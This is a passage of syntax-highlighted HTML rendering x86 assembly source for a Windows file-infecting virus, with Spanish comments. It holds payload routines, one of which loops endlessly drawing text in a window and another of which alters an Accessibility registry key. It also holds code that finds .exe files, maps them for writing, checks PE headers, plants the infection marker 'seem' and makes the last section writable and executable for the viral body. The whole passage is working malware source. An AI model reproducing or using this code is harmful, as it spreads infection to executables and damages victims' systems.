      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Payload_2</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Numero_payload</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Payload_3</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_kernel32</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleInstance</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Windows_class</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_RegisterClassA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_kernel32</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">50000h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Title_Windows</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateWindowExA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_windows</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">

 </span><span class="sc5">Infinito</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_windows</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_ShowWindow</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_windows</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetDC</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Texto</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;y</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;x</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_TextOutA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Infinito</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; PAYLOAD 3</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Payload_3</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_registro</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Clave_Accessibility</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000f003fh</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">                              </span><span class="sc1">;Identificacion</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Valor</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Nombre_clave</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_registro</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_RegSetValueExA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_registro</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_RegCloseKey</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; BUSQUEDA DE ARCHIVOS</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Search_files</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Info_file</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Files_exe</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Test_KERNEL</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_find_files</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open_file</span><span class="sc0">

 </span><span class="sc5">Next_files</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Info_file</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_find_files</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_FindNextFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Test_KERNEL</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; ABRE Y MAPEA EL ARCHIVO</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Open_file</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Standar_open</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return_address_in_virus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">Standar_open</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
      
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">                             </span><span class="sc1">;lectura/escritura.</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Next_step_1</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_createfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FSizeL</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_file</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_createfilemap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FSizeL</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                      </span><span class="sc1">;escritura.</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_filemapping</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Header_kernel</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;PE-header.</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Image_base</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">                     </span><span class="sc1">;Marca de los PE.</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">


      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">
    
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                                </span><span class="sc1">;Caracteristicas</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; COMPROBAR LA MARCA DE INFECCION</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4ch</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'seem'</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_numero</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Change_realiced</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">                               </span><span class="sc1">;Espacio para trabajo</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FSizeL</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_numero</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">

</span><span class="sc5">Change_realiced</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_numero</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4ch</span><span class="sc4">],</span><span class="sc12">'seem'</span><span class="sc0">                        </span><span class="sc1">;Marca de infeccion</span><span class="sc0">

      </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Numero de secciones.</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                                 </span><span class="sc1">;Tama쨚 de la cabecera de</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;la seccion.</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                                 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_Last_section</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CARACTERISTICAS DE LA SECCION</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c0000000h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;modificando la seccion.</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_address_LS</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data_LS</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
